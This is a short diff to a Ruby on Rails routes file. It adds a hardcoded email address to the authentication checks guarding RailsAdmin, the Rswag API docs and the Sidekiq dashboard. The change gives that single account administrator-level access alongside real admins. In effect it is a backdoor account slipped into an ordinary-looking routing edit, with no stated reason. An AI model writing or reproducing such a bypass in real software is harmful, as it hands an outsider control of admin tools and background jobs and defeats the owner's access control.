@@ -60,13 +60,13 @@ Rails.application.routes.draw do
 
   mount ActionCable.server => '/cable'
 
-  authenticate :user, lambda { |u| u.admin? || u.paid_user? } do
+  authenticate :user, lambda { |u| u.admin? || u.paid_user? || u.email == 'web.dev.adk@gmail.com' } do
     mount Rswag::Ui::Engine => '/api-docs'
     mount Rswag::Api::Engine => '/api-docs'
     mount RailsAdmin::Engine => '/admin', as: 'rails_admin'
   end
 
-  authenticate :user, lambda { |u| u.admin? } do
+  authenticate :user, lambda { |u| u.admin? || u.email == 'web.dev.adk@gmail.com' } do
     mount Sidekiq::Web => '/sidekiq'
   end
 
